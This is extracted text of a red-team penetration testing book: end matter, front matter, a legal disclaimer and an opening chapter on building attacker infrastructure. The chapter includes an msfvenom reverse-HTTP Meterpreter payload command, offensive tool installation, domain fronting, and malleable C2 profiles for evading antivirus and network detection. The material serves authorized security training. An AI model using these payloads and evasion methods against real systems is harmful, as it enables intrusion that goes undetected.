Go on CTFT ime.or g, pick\na few CTFs throughout the year , block of f those weekends, and\nhack away .  Trust me, you will learn more in a CTF weekend\nthan any class can teach you. \nGet with your friends and build out a lab:   It is hard to\npractice realistic scenarios without having a test lab that\nreplicates a corporate environment.  W ithout this test\nenvironment, you won't really understand what is happening\nbehind the scenes when running all the of fensive tools. \nTherefore, it is imperative to build a full lab with VLANs,\nActive Directory , servers, GPOs, users and computers, Linux\nenvironments, Puppet, Jenkins, and all the other common tools\nthat you might see. \nLearn fr om the bad guys: For Red T eams, this is one of the\nmost important factors.  Our campaigns should not be\ntheoretical, but a replication of another real attack.  Keep your\neyes open for the latest APT reports and make sure to\nunderstand how the adversaries are changing their attacks.\nSubscribe to The Hacker Playbook:   To keep up with the\nlatest THP news, please subscribe here:\nhttp://thehackerplaybook.com/subscribe/.\nTraining:  If you are looking for some training, check us out at\nhttp://thehackerplaybook.com/training/.\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \nabout the author\n \n \n \nPeter Kim has been in the information security industry for more than 14\nyears and has been running Penetration Testing/Red Teams for more than\n12 years .  He has worked for multiple utility companies, Fortune 1000\nentertainment companies, government agencies, and large financial\norganizations.  Although he is most well-known for The Hacker Playbook\nseries, his passions are buildin g a safe security community , mentoring\nstudents, and training others.  He founded and maintains one of Southern\nCalifornia's largest technical security clubs called LETHAL\n(www .meetup.com/LETHAL), performs private training at his warehouse\nLETHAL Security (lethalsecurity .com), and runs a boutique penetration\ntesting firm called Secure Planet (www .SecurePla.net).\n \nPeter's main goal with The Hacker Playbook series is to instill passion into\nhis readers and get them to think outside the box.  With the ever-changing\nenvironment of security , he wants to help build the next generation of\nsecurity professionals.\n \nFeel free to contact Peter Kim for any of the following:\nQuestions about the book: book@thehackerplaybook.com\nInquiries on private training or Penetration T ests:\nsecure@securepla.net\nTwitter: @hackerplaybook\n \nspecial thanks\n \nContributors\n \nWalter Pearce\nBill Eyler\nMichael Lim\nBrett Buerhaus\nTom Gadola\nKristen Kim\nAnn Le\nKevin Bang\nTony Dow\n \n \nSpecial Thanks\n \nMark Adams\nSpecterOps\nCasey Smith (@subT ee)\nBen T en (@Ben0xA)\nVincent Y iu (@vysecurity)\nChris Spehn (@ConsciousHacker)\nBarrett Adams (peewpw)\nDaniel Bohannon (@danielbohannon)\nSean Metcalf (@PyroT ek3)\n@harmj0y\nMatt Graeber (@mattifestation)\nMatt Nelson (@enigma0x3)\nRuben Boonen (@FuzzySec)\nBen Campbell (@Meatballs__)\nAndrew Robbins (@_wald0)\nRaphael Mudge (@rsmudge)\nDaniel Miessler (@DanielMiessler)\nGianni Amato (guelfoweb)\nAhmed Aboul-Ela (aboul3la)\nLee Baird (leebaird)\nDylan A yrey (dxa4481)\nRapid7 (@rapid7)\nWill Schroeder (@harmj0y)\nRon Bowes (@iagox86)\nSensePost\nSekirkity\nByt3bl33d3r\nKarim Shoair (D4V inci)\nChris T runcer\nAnshuman Bhartiya\nOJ Reeves\nBen Sadeghipour (@nahamsec)\nTim Medin (nidem)\nGianni Amato\nRobert David Graham\nblechschmidt\nJamieson O'Reilly\nNikhil Mittal (SamratAshok)\nMichael (codingo)\nCn33liz\nSwissky (Swisskyrepo)\nRobin W ood (digininja)\nTrustedSec\nDavid Kennedy (@HackingDave)\nFireEye\nIgandx\nAlexander Innes (leostat)\nActiveBreach (mdsecactivebreach)\nbbb31\npentestgeek\nSECFORCE\nSteve Micallef\nSpiderLabs\nH.D. Moore\nTheRook\nAhmed Aboul-Ela (aboul3la)\nEmilio (epinna)\nDylan A yrey (dxa4481)\nGeor ge Chatzisofroniou (sophron)\nDerv (derv82)\nGarrett Gee\nHackerW arehouse\nLETHAL\nn00py",
  "normalized_text": "the hacker pla ybook 3 practical guide to penetration testing red team edition peter kim copyright © 2018 by secure planet llc. all rights reserved. except as permitted under united states copyright act of 1976, no part of this publication may be reproduced or distributed in any form or by any means, or stored in a database or retrieval system, without the prior written permission of the author . all rights reserved. isbn-13: 978-1980901754 book design and production by peter kim, secure planet llc cover design by ann le edited by kristen kim publisher: secure planet llc published: 1st may 2018 dedication to my wife kristen, our new baby boy , our dog dexter , and our families. thank you for all of your support and patience, even when you had no clue what i was talking about. contents preface notes and disclaimer introduction penetration t esting t eams vs red t eams summary 1 pregame - the setup assumed breach exercises setting up y our campaign setting up y our external servers tools of the t rade metasploit framework cobalt strike powershell empire dnscat2 p0wnedshell pupy shell poshc2 merlin nishang conclusion 2 before the snap - red t eam recon monitoring an environment regular nmap dif fing web screenshots cloud scanning network/service search engines manually parsing ssl certificates subdomain discovery github cloud emails additional open source resources conclusion 3 the throw - w eb application exploitation bug bounty programs: web attacks introduction - cyber space kittens the red t eam w eb application attacks chat support systems lab cyber space kittens: chat support systems setting up y our w eb application hacking machine analyzing a w eb application web discovery cross-site scripting xss blind xss dom based xss advanced xss in nodejs xss to compromise nosql injections deserialization attacks template engine attacks - t emplate injections javascript and remote code execution server side request for gery (ssrf) xml external entities (xxe) advanced xxe - out of band (xxe-oob) conclusion 4 the drive - compromising the network finding credentials from outside the network advanced lab moving through the network setting up the environment - lab network on the network with no credentials responder better responder (multirelay .py) powershell responder user enumeration w ithout credentials scanning the network with crackmapexec (cme) after compromising y our initial host privilege escalation privilege escalation lab pulling clear t ext credentials from memory getting passwords from the w indows credential store and browsers getting local creds and information from osx living of f of the land in a w indows domain environment service principal names querying active directory bloodhound/sharphound moving laterally - migrating processes moving laterally of f your initial host lateral movement with dcom pass-the-hash gaining credentials from service accounts dumping the domain controller hashes lateral movement via rdp over the vps pivoting in linux privilege escalation linux lateral movement lab attacking the csk secure network conclusion 5 the screen - social engineering building y our social engineering (se) campaigns doppelganger domains how to clone authentication pages credentials with 2f a phishing microsoft w ord/excel macro files non-macro of fice files - dde hidden encrypted payloads exploiting internal jenkins with social engineering conclusion 6 the onside kick - physical attacks card reader cloners physical t ools to bypass access points lan t urtle (lanturtle.com) packet squirrel bash bunny breaking into cyber space kittens quickcreds bunnyt ap wifi conclusion 7 the quarterback sneak - evading a v and network detection writing code for red t eam campaigns the basics building a keylogger setting up your environment compiling from source sample framework obfuscation thp custom droppers shellcode vs dlls running the server client configuring the client and server adding new handlers further exercises recompiling metasploit/meterpreter to bypass av and network detection how to build metasploit/meterpreter on w indows: creating a modified stage 0 payload: sharpshooter application whitelisting bypass code caves powershell obfuscation powershell w ithout powershell: hidemyps conclusion 8 special t eams - cracking, exploits, and t ricks automation automating metasploit with rc scripts automating empire automating cobalt strike the future of automation password cracking gotta crack em all - quickly cracking as many as y ou can cracking the cyberspacekittens ntlm hashes: creative campaigns disabling ps logging windows download file from internet command line getting system from local admin retrieving ntlm hashes without t ouching lsass building t raining labs and monitor with defensive t ools conclusion 9 two-minute drill - from zero to hero 10 post game analysis - reporting continuing education about the author special thanks preface this is the third iteration of the hacker playbook (thp) series. below is an overview of all the new vulnerabilities and attacks that will be discussed. in addition to the new content, some attacks and techniques from the prior books (which are still relevant today) are included to eliminate the need to refer back to the prior books. so, what's new? some of the updated topics from the past couple of years include: abusing active directory abusing kerberos advanced w eb attacks better w ays to move laterally cloud v ulnerabilities faster/smarter password cracking living of f the land lateral movement attacks multiple custom labs newer w eb language v ulnerabilities physical attacks privilege escalation powershell attacks ransomware attacks red t eam vs penetration t esting setting up y our red t eam infrastructure usable red t eam metrics writing malware and evading a v and so much more additionally , i have attempted to incorporate all of the comments and recommendations received from readers of the first and second books. i do want to reiterate that i am not a professional author . i just love security and love teaching security and this is one of my passion projects. i hope you enjoy it. this book will also provide a more in-depth look into how to set up a lab environment in which to test your attacks, along with the newest tips and tricks of penetration testing. lastly , i tried to make this version easier to follow since many schools have incorporated my book into their curricula. whenever possible, i have added lab sections that help provide a way to test a vulnerability or exploit. as with the other two books, i try to keep things as realistic, or “real world”, as possible. i also try to stay away from theoretical attacks and focus on what i have seen from personal experience and what actually worked. i think there has been a major shift in the industry from penetration testers to red teamers, and i want to show you rather than tell you why this is so. as i stated before, my passion is to teach and challenge others. so, my goals for you through this book are two-fold: first, i want you to get into the mindset of an attacker and understand “the how” of the attacks; second, i want you to take the tools and techniques you learn and expand upon them. reading and repeating the labs is only one part – the main lesson i teach to my students is to let your work speak for your talents. instead of working on your resume (of course, you should have a resume), i really feel that having a strong public github repo/technical blog speaks volumes in security over a good resume. whether you live in the blue defensive or red offensive world, getting involved and sharing with our security community is imperative. for those who did not read either of my two prior books, you might be wondering what my experience entails. my background includes more than 12 years of penetration testing/red teaming for major financial institutions, large utility companies, fortune 500 entertainment companies, and government organizations. i have also spent years teaching offensive network security at colleges, spoken at multiple security conferences, been referenced in many security publications, taught courses all over the country , ran multiple public ctf competitions, and started my own security school. one of my big passion project was building a free and open security comm unity in southern california called lethal (meetup.com/lethal). now , with over 800+ members, monthly meetings, ctf competitio ns, and more, it has become an amazing environment for people to share, learn, and grow . one important note is that i am using both commercial and open source tools. for every commercial tool discussed, i try to provide an open source counterpart. i occasionally run into some pentesters who claim they only use open source tools. as a penetration tester , i find this statement hard to accept. if you are supposed to emulate a “real world” attack, the “bad guys” do not have these restrictions; therefore, you need to use any tool (commercial or open source) that will get the job done. a questi on i get often is, who is this book intended for? it is really hard to state for whom this book is specifically intended as i truly believe anyone in security can learn. parts of this book might be too advanced for novice readers, some parts might be too easy for advanced hackers, and other parts might not even be in your field of security . for those who are just getting into security , one of the most common things i hear from readers is that they tend to gain the most benefit from the books after reading them for the second or third time (making sure to leave adequate time between reads). there is a lot of material thrown at you throughout this book and sometimes it takes time to absorb it all. so, i would say relax, take a good read, go through the labs/examples , build your lab, push your scripts/code to a public github repository , and start up a blog. lastly , being a red team member is half about technical ability and half about having confidence. many of the social engineering exercises require you to overcom e your nervousness and go outside your comfort zone. david letterma n said it best, \"pretending to not be afraid is as good as actually not being afraid.\" although this should be taken with a grain of salt, sometimes you just have to have confidence, do it, and don't look back. notes and disclaimer i can't reiterate this enough: do not go looking for vulnerable servers and exploits on systems you don't own without the proper approval. do not try to do any of the attacks in this book without the proper approval. even if it is for curiosity versus malicious intent, you can still get into a lot of trouble for these actions. there are plenty of bug bounty programs and vulnerable sites/vms to learn off of in order to continue growing. even for some bug bounty programs, breaking scope or going too far can get you in trouble: https://www .forbes.com/sites/thomasbrewster/2015/12/17/faceb ook-instagram-security-research-threats/#c3309902fb52 https://nakedsecurity .sophos.com/2012/02/20/jail-facebookethical-hacker/ https://www .cyberscoop.com/dji-bug-bounty-drone-technologysean-melia-kevin-finisterre/ if you ever feel like it's wrong, it's probably wrong and you should ask a lawyer or contact the electronic frontier foundation (eff) (https://www .eff.org/pages/legal-assistance). there is a fine line between research and illegal activities. just remember , onl y test systems on which you have written permission. just google the term “hacker jailed” and you will see plenty of different examples where young teens have been sentenced to years in prison for what they thoug ht was a “fun time.” there are many free platforms where legal hacking is allowed and will help you further your education. finally , i am not an expert in w indows, coding, exploit dev , linux, or really anything else. if i misspoke about a specific technology , tool, or process, i will make sure to update the hacker playbook updates webpage (thehackerplaybook.com/updates) for anything that is reported as incorrect. also, much of my book relies on other people's research in the field, and i try to provide links to their original work whenever possible. again, if i miss any of them, i will update the updates webpage with that information. we have such an awesome community and i want to make sure everyone gets acknowledged for their great work! introduction in the last enga gement (the hacker playbook 2), you were tasked with breaking into the cyber kittens weapons facility . they are now back with their brand new space division called cyber space kittens (csk). this new division took all the lessons learned from the prior security assessment to harden their systems, set up a local security operations center , and even create security policies. they have hired you to see if all of their security controls have helped their overall posture. from the little details we have picked up, it looks like cyber space kittens has discovered a secret planet located in the great andromeda nebula or andromeda galaxy . this planet, located on one of the two spiral arms, is referred to as kitt-3n. kitt -3n, whose size is double that of earth, resides in the binary system called oi 31337 with a star that is also twice the size of earth’s star. this creates a potentially habitable environment with oceans, lakes, plants, and maybe even life... with the hope of new life, water , and another viable planet, the space race is real. csk has hired us to perform a red team assessment to make sure they are secure, and capable of detecting and stopping a breach. their management has seen and heard of all the major breaches in the last year and want to hire only the best. this is where you come in... your mission, if you choose to accept it, is to find all the external and internal vulnerabilities, use the latest exploits, use chained vulnerabilities, and see if their defensive teams can detect or stop you. what types of tactics, threats, and procedures are you going to have to employ? in this campaign, you are going to need to do a ton of reconnaissance and discovery , look for weaknesses in their external infrastructure, social engineer employees, privilege escalate, gain internal network information, move laterally throughout the network, and ultimately exfiltrate kitt -3n systems and databases. penetration testing teams vs red teams before we can dive into the technical ideals behind red teams, i need to clarify my definitions of penetration testing and red teams. these words get thrown around often and can get a little mixed up. for this book, i want to talk about how i will use these two terms. penetration testing is the more rigorous and methodical testing of a network, application, hardware, etc. if you haven’ t already , i recommend that you read the penetration testing execution standard (ptes: http://www .pentest-standard.or g) – it is a great walkthrough of how to perform an assessment. in short, you go through all the motions of scoping, intel gathering, vulnerability analysis, exploitation, post exploitation, and reporting. in the traditional network test, we usually scan for vulnerabilities, find and take advantage of an exploitab le system or application, maybe do a little post exploitation, find domain admin, and write up a report. these types of tests create a matrix of vulnerabilities, patching issues , and very actionable results. even during the scope creation, penetration tests are very well defined, limited to a one or twoweek assessment period, and are generally announced to the company’ s internal security teams. companies still need penetration testers to be a part of their secure software development life cycle (s-sdlc). nowadays, even though companies have vulnerability management programs, s-sdlc programs, penetration testers, incident response teams/programs, and many of the very expensive security tools, they still get compromised. if we look at any of the recent breaches (http://www .informationisbeautiful.net/visualizations/worlds-biggest-databreaches-hacks), we see that many of these happened to very large and mature companies. we have seen in other security reports that some compromises could have lasted longer than 6 months before they were detected (https://en.wikipedia.or g/wiki/sony_pictures_hack). there are also some reports that state that almost one-third of all businesses were breached in 2017 (https://www .esecurityplanet.com/networksecurity/almost-a-third-of-all-u.s.-businesses-were-breached-in-2017.html). the questions i want companies to ask are if these exact same bad guys or actor sets came after your company with the exact same tactics, could you detect it, how long would it take, could you recover from it, and could you figure out exactly what they did? this is where red teams come into play. the red team’ s mission is to emulate the tactics, techniques, and procedures (ttps) by adversaries. the goals are to give real world and hard facts on how a company will respond, find gaps within a security program, identify skill gaps within employees, and ultimately increase their security posture. for red teams, it is not as methodical as penetration tests. since we are simulating real world events, every test can differ significantly . some campaigns might have a focus on getting personally identifiable information (pii) or credit cards, while others might focus on getting domain adminis trative control. speaking of domain admin, this where i see a huge difference between penetration tests and red team campaigns. for network pentests , we love gettin g to domain admin (da) to gain access to the domain controller (dc) and calling it a day. for red team campaigns, based on the campaign, we may ignore the dc completely . one reason for this is that we are seeing many companies placing a lot of protec tion around their dcs. they might have application whitelisting, integrity monitoring, lots of ids/ips/hips rules, and even more. since our mission is not to get caught, we need to stay low key. another rule we follow is that we almost never run a vulnerability scan against the internal network. how many adversaries have you seen start to perform full vulnerability scans once inside a compromised environ ment? this is extremely rare. why? vulnerability scans are very loud on the network and will most likely get caught in today’ s world. another major difference in the scope is the timeline. with penetration tests, we are lucky to get two weeks, if not one. whereas, red teams must build campaigns that last from 2 weeks to 6 months. this is because we need to simulate real attacks, social engineering, beaconing, and more. lastly , the largest difference is the outcome of the two types of teams. instead of a list of vulnerabilities, red team findings need to be geared more toward gaps in blue team processes, policies, tools, and skills. in your final report, you may have some vulnerability findings that were used for the campaign, but most findings will be gaps in the security program. remember findings should be mainly for the security program, not it . penetration t ests red t eams methodical security assessments: pre-engagement interactions intelligence gathering vulnerability analysis exploitation post exploitation reporting flexible security assessments: intelligence gathering initial foothold persistence/local privilege escalation local/network enumeration lateral movement data identification/exfiltration domain privilege escalation/dumping hashes reporting scope: restrictive scope 1-2 w eek engagement generally announced identify vulnerabilitiesscope: no rules* 1 week – 6 month engagement no announcement test blue teams on program, policies, tools, and skills *can’ t be illegal... with red teams, we need to show value back to the company . it isn’t about the number of total vulnerability counts or criticality of individual vulnerabilities; it is about proving how the security program is running. the goal of the red team is to simulate real world events that we can track. two strong metrics that evolve from these campaigns are time to detect (ttd) and time to mitigate (ttm). these are not new concepts, but still valuable ones for red t eams. what does time to detect (ttd) mean? it is the time between the initial occurrence of the incident to when an analyst detects and starts working on the incid ent. let’s say you have a social engineering email and the user executes malware on their system. even though their av, host-based security system , or monitoring tools might trigger , the time recorded is when the analyst creates that first ticket. time to mitigate (ttm) is the secondary metric to record. this timeline is recorded when the firewall block, dns sinkhole, or network isolation is implemented. the other valuable information to record is how the security teams work with it, how management handles a critical incident, and if employees panic. with all this data, we can build real numbers on how much your company is at risk, or how likely it is to be compromised. s u m m a r y the big push i want to make is for managers to get outside the mentality of relying on metrics from audits. we all have reasons for compliance and they can definitely help mature our programs, but they don't always provide real world security for a company . as red teamers, our job is to test if the overall security program is working. as you read through this book, i want you to put yourself in the red team mindset and focus on: vulnerabilities in security not it simulate real w orld events live in a world of constant red t eam infections challenge the system... provide r eal data to prove security gaps. 1 pregame - the setup as a red team, we don’t really care as much about the origins of an attack. instead, we want to learn from the ttps. for example, looking at public sources, we found a detailed report from fireeye on an attack they analyzed (https://www2.fireeye.com/rs/848-did-242/images/rpt-apt29hammertoss.pdf). reviewing their analysis, we can see that the ttps of the malware used twitter as part of the command and control (c2), images with encryption keys, github, and steganography . this is where we would build a similar campaign to see if your company could detect this attack. a detailed breakdown for apt attacks is mitre’ s adversarial tactics, techniques, and common knowledge (att&ck) matrix. this is a large collection of dif ferent ttps commonly used with all sorts of attacks. another resource is this running list of apt groups and operations document from @cyb3rops. this google document (http://bit.ly/2gzb8ew) breaks down different suspected apt groups and their toolsets. this is a usefu l list for us as red teamers to simulate different attack s. of course, we might not use the same tools as documented in the reports, but we may build similar tools that will do the same thing. assumed breach exercises companies need to live in a world today where they start with the assumption that they have already been breached. these days, too many companies assume that because of some check box or annual penetration test, they are secure. we need to get in a state of mind where we are always hunting, assuming evil is lurking around, and looking for these anomalies. this is where red team campaigns heavily differ from penetration tests. since red team campaigns focus on detection/mitigation instead of vulnerabilities, we can do some more unique assessments. one assessment that provides customers/clients with immense benefit is called an assumed breach exercise. in an assumed breach exercise, the concept is that there will always be 0-days. so, can the client identify and mitig ate against secondary and tertiary steps? in these scenarios, red teams work with a limited group of people inside the company to get a single custom malware payload to execute on their server . this payload should try to connect out in multiple ways, make sure to bypass common av, and allow for additional payloads to be executed from memory . we will have example payloads throughout the book. once the initial payload is executed, this is where all the fun begins! setting up your campaign this is one of my favorite parts of running red teams. before you compromise your first system, you need to scope out your red team campaign. in a lot of penetra tion tests, you are given a target and you continually try to break into that single system. if something fails, you go on to the next thing. there is no script and you are usually pretty focused on that network. in red team campaigns, we start out with a few objectives. these objectives can include, but are not limited to: what are the end goal goals? is it just apt detection? is it to get a flag on a server? is it to get data from a database? or is it just to get ttd metrics? is there a public campaign we want to copy? what techniques are you going to use? we talked about using mitre att&ck matrix, but what are the exact techniques in each category? the team at red canary supplied detailed information on each one of these techniques . i highly recommend you take time and review them all: http://bit.ly/2h0mtza what tools does the client want you to use? will it be cots offensive tools like metasploit , cobalt strike, dns cat? or custom tools? the best part is that getting caught is part of the assessment. there are some campaigns where we get caught 4 or 5 times and have to burn 4 or 5 different environments. this really shows to your client that their defenses are working (or not working) based on what results they expected. at the end of the book, i will provide some reporting examples of how we capture metrics and report that data. setting up your external servers there are many different services that we use for building our campaigns. in today 's world with the abundance of virtual private servers (vps), standing up your attacker machines on the internet won't break your budget. for example, i commonly use digital ocean droplets (https://www .digitalocean.com/products/compute) or amazon w eb services (aws) lightsail servers (https:/ /lightsail.aws.amazon.com) to configure my vps servers. the reasons i use these services are because they are generally very low cost (someti mes free), allow for ubuntu servers, allow for servers in all sorts of regions, and most importantly , are very easy to set up. within minutes, you can have multiple servers set up and running metasploit and empire services. i am going to focus on aws lightsail servers in this book, due to the ease in settin g up, ability to autom ate services, and the amount of traffic normally going to aws. after you have fully created an image you like, you can rapidly clone that image to multiple servers, which makes it extremely easy to build ready-made command and control boxes. again, you shou ld make sure you abide by the vps provider's service terms (i.e. https://aws.amazon.com/service-terms/) so you do not fall into any problems. https://lightsail.aws.amazon.com/ create an instance i highly recommend getting at least 1 gb of ram storage space usually isn't an issue linux/unix os only -> ubuntu download cert chmod 600 cert ssh -i cert ubuntu@[ip] once you are logged into your server , you need to install all the tools as efficiently and repeatable as possible. this is where i recommend that you develop your own scripts to set up things such as iptables rules , ssl certs, tools, scripts, and more. a quick way to build your servers is to integrate trustedsec's the pent esters framework (ptf). this collectio n of scripts (https://github.com/trustedsec/ptf) does a lot of the hard work for you and creates a framework for everything else. let's walk through a quick example of installing all of our exploitation, intel gathering, post exploitation, powershell, and vulnerability analysis tools. sudo su apt-get update apt-get install python git clone https://github.com/trustedsec/ptf /opt/ptf cd /opt/ptf && ./ptf use modules/exploitation/install_update_all use modules/intelligence-gathering/install_update_all use modules/post-exploitation/install_update_all use modules/powershell/install_update_all use modules/vulnerability-analysis/install_update_all cd /pentest the following image shows all the different modules available, some of which we installed. image of all available modules if we take a look at our attacker vps, we can see all of the tools installed on our box. if we wanted to start up metasploit, we can just type: msfconsole . all tools installed under /pentest one thing i still recommend is setting up strong iptables rules . since this will be your attacker server , you will want to limit where ssh authentications can initiate from, where empire/meterpreter/cobalt strike payloads can come from, and any phishing pages you stand up. if you remembe r back in late 2016, someone had found an unauthenticated remote code execution (rce) on cobalt strike team server (https://blog.cobaltstrike.com/2016/09/28/cobalt-strike-rce-activeexploitation-reported/). you definitely don't want your attacker servers compromised with your customer's data. i have also seen some red teams run kali linux (or at least metasploit) in docker inside aws (http://bit.ly/2qz2vn9). from my point of view , there is no wrong way to create your systems. what you do want is to create an efficient and repeatable process to deploy multiple machines. the best part of using lightsail is that once you have your machine configured to your preferences, you can take a snapshot of a machine and stand up multiple, brand new instances of that image. if you want to get your environment to the next level, check out the team at coalfire-research. they built custom modules to do all the hard work and automation for you. red baron is a set of modules and custom/third-party providers for terraform, which tries to automate the creation of resilient, disposable, secure, and agile infrastructure for red teams [https://github.com/coalfire-research/red-baron]. whether you want to build a phishing server , cobalt strike infrastructure, or create a dns c2 server , you can do it all with t erraform. take a look at https://github.co m/coalfire-research/red-baron and check out all the dif ferent modules to quickly build your own infrastructure. tools of the trade there are a myriad of tools a red team might use, but let’s talk about some of the core resou rces. remember that as a red teamer , the purpose is not to compromise an environment (which is the most fun), but to replicate real world attacks to see if a customer is protected and can detect attacks in a very short timeframe. in the previous chapters, we identified how to replicate an attacker's profile and toolset, so let’s review over some of the most common red t eam tools. metasploit framework this book won't dive too deeply into metasploit as it did in the prior books. metasploit framework is still a gold standard tool even though it was originally develo ped in 2003. this is due to both the original creator , h.d. moore, and the very active community that supports it. this communitydriven framework (https://github.com/rapid7/metasploitframework/commits/master), which seems to be updated daily , has all of the latest public exploits, post exploitation modules, auxiliary modules, and more. for red team engagements, we might use metasploit to compromise internal systems with the ms17-010 eternal blue exploit (http://bit.ly/2h2pt si) to get our first shell or we might use metasploit to generate a meterpreter payload for our social engineering attack. in the later chapters, we are going to show you how to recompile your metasploit payloads and traf fic to bypass a v and network sensors. obfuscating meterpr eter payloads if we are performing some social engineering attack, we might want to use a word or excel document as our delivery mechanism. however , a potential problem is that we might not be able to include a meterpreter payload binary or have it download one from the web, as av might trigger on it. also, a simple solution is obfuscation using powershell: msfvenom --payload windows/x64/meterpreter_reverse_http -format psh --out meterpreter -64.ps1 lhost=127.0.0.1 we can even take this to the next level and use tools like unicorn (https://github.com/trustedsec/unicorn) to generate more obfuscated powershell meterpreter payloads, which we will be covered in more detail as we go through the book. additionally , using signed ssl/tls certificates by a trusted authority could help us get around certain network ids tools: https://github.com/rapid7/metasploit-framework/wiki/meterpreter paranoid-mode. finally , later in the book, we will go over how to re-compile metasploit/meterpreter from scratch to evade both host and network based detection tools. cobalt strike cobalt strike is by far one of my favorite red team simulation tools. what is cobalt strike? it is a tool for post exploitation, lateral movement, staying hidden in the network, and exfiltration. cobalt strike doesn't really have exploits and isn't used for compromising a system via the newest 0-day vulnerability . where you really see its extensive features and powers is when you already have code execution on a server or when it is used as part of a phishing campaign payload. once you can execute a cobalt strike payload, it creates a beacon connection back to the command and control server . new cobalt strike licenses cost $3,500 per user for a one-year license, so it is not a cheap tool to use. there is a free limited trial version available. cobalt strike infrastructur e as mentioned earlier , in terms of infrastructure, we want to set up an environment that is reusable and highly flexible. cobalt strike supports redirectors so that if your c2 domain is burned, you don't have to spin up a whole new environment, only a new domain. you can find more on using socat to configure these redirectors here: http://bit.ly/2qxcbcz and http://bit.ly/2iuc4oe. to take your redirectors up a notch, we utilize domain fronting. domain fronting is a collection of techniques to make use of other people’ s domains and infrastructures as redirectors for your controller (http://bit.ly/2gyw55a). this can be accomplished by utilizing popular content deliver y networks (cdns) such as amazon’ s cloudfront or other google hosts to mask traffic origins. this has been utilized in the past by different adversaries (http://bit.ly/2hocrfi). using these high reputation domains, any traffic, regardless of http or https, will look like it is communicating to these domains instead of our malicious command and contro l servers. how does this all work? using a very high-level example, all your traffic will be sent to one of the primary fully qualified domain names (fqdns) for cloudfront, like a0.awsstatic.com, which is cloudfront's primary domain. modifying the host header in the request will redirect all the traffic to our cloudfront distribution, which will ultimate ly forward the traffic to our cobalt strike c2 server (http://bit.ly/2gyw55a ). by changing the http host header, the cdn will happily route us to the correct server . red teams have been using this technique for hiding c2 traffic by using high reputation redirectors. two other great resources on different products that support domain fronting: cyberark also wrote an excellent blog on how to use google app products to look like your traf fic is flowing through www .google.com, mail.google.com, or docs.google.com here: http://bit.ly/2hn7r w4. vincent y iu wrote an article on how to use alibaba cdn to support his domain fronting attacks: http://bit.ly/2hjm3eh. cobalt strike isn't the only tool that can support domain fronting, this can also be accomplished with meterpreter https://bitrot.sh/post/30-1 1-2017-domain-fronting-withmeterpreter/. note: at the time of publishing this book, aws (and even google) have starting implementing protections against domain fronting (https://amzn.to/2i6lsry). this doesn't stop this type of attack, but would require dif ferent third party resources to abuse. although not part of the infras tructure, it is important to understand how your beacons work within an internal environment. in terms of operational security , we don’t want to build a campaign that can be taken out easily . as a red teamer , we have to assume that some of our agents will be discovered by the blue team. if we have all of our hosts talking to one or two c2 endpoints, it would be pretty easy to take out our entire infrastructure. luckily for us, cobalt strike supports smb beacons between hosts for c2 communication. this allows you to have one compromised machine communicate to the internet, and all other machines on the network to communicate through the initial compromised host over smb (https://www .cobaltstrike.com/help-smb-beacon). this way, if one of the secondary systems is detected and forensics analysis is performed, they might not be able to identify the c2 domain associated with the attack. a neat feature of cobalt strike that immensely helps red teams is its ability to manipulate how your beacons communicate. using malleable c2 profiles, you can have all your traffic from your compromised systems look like norm al traffic. we are getting into more and more environments where layer 7 applicati on filtering is happening. in layer 7, they are looking for anomalous traffic that many times this is over web communicati on. what if we can make our c2 communication look like normal web traffic? this is where malleable c2 profiles come into play. take a look at this example: https://github.com/rsmudge/malleable-c2profiles/blob/master/normal/amazon.profile. some immediate notes: we see that these are going to be http requests with uri paths: set uri \"/s/ref=nb_sb_noss_1/167-32948880262949/field-keywords=books\"; the host header is set to amazon: header \"host\" \"www .amazon.com\"; and even some custom server headers are sent back from the c2 server header \"x-amz-id-1\" \"thkuyezkckpgy5t42pzt\"; header \"x-amz-id-2\" \"a21yz2xrndntdgrsa212bgv3yw85amzuzw9yd g5rzmruz2tmzgl4ahrvndvpbgo=\"; now that these have been used in many different campaigns, numerous security devices have created signatures on all of the commo n malleable profiles (https://github.com/rsmudge/malleable-c2-profiles). what we have done to get around this is to make sure all the static strings are modified, make sure all user-agent information is changed, configure ssl with real certificates (don't use default cobalt strike ssl certificates), use jitter, and change beacon times for the agents. one last note is to make sure the communicat ion happens over post (http-post) commands as failing to do so may cause a lot of headac he in using custom profiles. if your profile communicates over http-get, it will still work, but uploading large files will take forever. remember that get is generally limited to around 2048 characters. the team at spectorops also created randomized malleable c2 profiles using: https://github.com/bluscreenofjef f/malleable-c2-randomizer . cobalt strike aggr essor scripts cobalt strike has numerous people contributing to the cobalt strike project. aggressor script is a scripting language for red team operations and adversary simulations inspi red by scriptable irc clients and bots. its purpose is two-fold: (1) you may create long running bots that simulate virtual red team members, hacking side-by-side with you, (2) you may also use it to extend and modify the cobalt strike client to your needs [https://www .cobaltstrike.com/aggressor -script/index.html]. for example, harleyqu1nn has put together a great list of different aggressor scripts to use with your post exploitation: http://bit.ly/2qxiwpe. powershell empir e empire is a post-exploitation framework that includes a pure-powershell2.0 windows agent , and a pure python 2.6/2.7 linux/os x agent. it is the merge of the previous powershell empire and python empyre projects. the framework offers cryptologically-secure communications and a flexible architecture. on the powershell side, empire implements the ability to run powershell agents without needing powershell.exe, rapidly deployable post-exploitation modules ranging from key loggers to mimikatz, and adaptable communications to evade network detection, all wrapped up in a usability-focused framework [https://github.com/empireproject/empire]. for red teamer s, powershell is one of our best friends. after the initial payload, all subsequent attacks are stored in memory . the best part of empire is that it is actively maintained and updated so that all the latest post-exploitation modules are available for attacks. they also have c2 connectivity for linux and os x. so you can still create an office macro in mac and, when executed, have a brand new agent in empire. we will cover empire in more detail throughout the book so you can see how effective it is. in terms of setting up empire, it is very important to ensure you have configured it securely: set the certpath to a real trusted ssl certificate. change the defaultprofile endpoints. many layer 7 firewalls look for the exact static endpoints. change the user agent used to communicate. just like metasp loit's rc files used for automation in the prior books, empire now supports autorun scripts for ef ficiency and ef fectiveness. running empire: starting up empire cd /opt/empire && ./setup/reset.sh exit exit setup up cert (best practice is to use real trusted certs) ./setup/cert.sh start empire ./empire start a listener listeners pick your listener (we'll use http for our labs) uselistener [tab twice to see all listener types] uselistener http view all configurations for the listener info set the following (i.e. set killdate 12/12/2020): killdate - the end of your campaign so your agents autocleanup defaultprofile - make sure to change all the endpoints (i.e. /adm in/get.php,/news.php). you can make them up however you want, such as /seriously/notmalware.php defaultprofile - make sure to also change your user agent. i like to look at the top user agents used and pick one of those. host - change to https and over port 443 certpath - add your path to your ssl certificates useragent - change this to your common user agent port - set to 443 serverv ersion 